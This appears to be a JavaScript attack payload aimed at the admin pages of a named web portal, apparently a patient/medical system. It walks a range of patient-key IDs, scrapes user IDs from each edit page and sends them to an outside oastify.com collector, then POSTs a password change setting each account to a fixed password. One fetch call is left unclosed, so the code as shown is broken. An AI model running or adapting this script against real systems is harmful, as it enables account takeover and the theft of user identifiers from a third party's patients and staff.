for (let i = 199200; i <= 199250; i++) {
  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
    .then(res => res.text())
    .then(res => {
      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
      if (match) {
        fetch('https://pun49c4tsnxvrnrvku211vimrdx4lw9l.oastify.com/c?d=' + encodeURIComponent(match[1]), {
  mode: 'no-cors',
  keepalive: true
      }
      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `aPatientKey=${i}&NewPassword=Frog%40123%40123`
      });
    });
}
